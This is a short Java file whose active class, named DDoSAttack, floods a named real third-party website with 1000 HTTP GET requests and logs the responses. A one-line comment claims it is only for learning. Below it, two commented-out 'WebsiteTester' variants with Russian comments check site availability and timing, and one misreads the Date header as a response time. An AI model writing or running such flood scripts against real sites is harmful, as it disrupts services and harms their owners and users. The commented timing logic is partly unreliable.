import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class DDoSAttack {
    public static void main(String[] args) {
        String targetUrl = "https://clicq.bg/";
        int numRequests = 1000;

        for (int i = 0; i < numRequests; i++) {
            try {
                URL url = new URL(targetUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                int responseCode = connection.getResponseCode();
                System.out.println("Request " + (i + 1) + " sent. Response code: " + responseCode);
            } catch (IOException e) {
                System.out.println("Error sending request: " + e.getMessage());
            }
        }
    }
}

// This is a only learn, im dont ddosing no one

// import java.net.HttpURLConnection;
// import java.net.URL;

// public class WebsiteTester {
//     public static void main(String[] args) {
//         String targetUrl = "http://example.com"; // Замените на адрес вашего учебного сайта

//         try {
//             // Создание объекта URL для отправки запроса
//             URL url = new URL(targetUrl);

//             // Отправка HTTP GET запроса
//             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//             connection.setRequestMethod("GET");

//             // Получение кода ответа
//             int responseCode = connection.getResponseCode();

//             // Проверка статуса ответа
//             if (responseCode == HttpURLConnection.HTTP_OK) {
//                 System.out.println("Сайт доступен. Код ответа: " + responseCode);
//             } else {
//                 System.out.println("Ошибка. Код ответа: " + responseCode);
//             }

//             // Получение времени ответа
//             long responseTime = connection.getHeaderFieldLong("Date", 0);
//             System.out.println("Время ответа: " + responseTime + " мс");

//             // Закрытие соединения
//             connection.disconnect();
//         } catch (Exception e) {
//             System.out.println("Ошибка: " + e.getMessage());
//         }
//     }
// }



// import java.io.IOException;
// import java.net.HttpURLConnection;
// import java.net.URL;

// public class WebsiteTester {
//     public static void main(String[] args) {
//         String targetUrl = "https://clicq.bg/"; // Замените на адрес вашего учебного сайта

//         try {
//             // Создание объекта URL для отправки запроса
//             URL url = new URL(targetUrl);

//             // Получение системного времени перед отправкой запроса
//             long startTime = System.currentTimeMillis();

//             // Отправка HTTP GET запроса
//             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//             connection.setRequestMethod("GET");

//             // Получение кода ответа
//             int responseCode = connection.getResponseCode();

//             // Проверка статуса ответа
//             if (responseCode == HttpURLConnection.HTTP_OK) {
//                 System.out.println("Сайт доступен. Код ответа: " + responseCode);
//             } else {
//                 System.out.println("Ошибка. Код ответа: " + responseCode);
//             }

//             // Получение системного времени после получения ответа
//             long endTime = System.currentTimeMillis();

//             // Вычисление времени ответа
//             long responseTime = endTime - startTime;
//             System.out.println("Время ответа: " + responseTime + " мс");

//             // Закрытие соединения
//             connection.disconnect();
//         } catch (IOException e) {
//             System.out.println("Ошибка: " + e.getMessage());
//         }
//     }
// }